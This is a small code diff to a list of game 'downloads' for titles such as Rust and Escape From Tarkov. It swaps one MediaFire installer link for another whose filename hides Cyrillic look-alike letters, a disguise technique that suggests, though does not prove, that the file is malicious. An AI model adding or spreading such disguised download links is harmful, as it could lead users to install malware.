@@ -134,7 +134,7 @@ export const ItemsList = [
         title: "Rust",
         downloadCount: "16.4K",
         src: "/icons/rust.png",
-        downloadLink: "https://download1074.mediafire.com/pmc9ux26qvog/qmosqb1upxzslz4/installerx64+.zip"
+        downloadLink: "https://download1322.mediafire.com/radz7d9t2tig/9mb0u6l1wuy0xg3/%D1%96nstaller%D1%8564+.zip"
       },
       {
         title: "Escape From Tarkov",
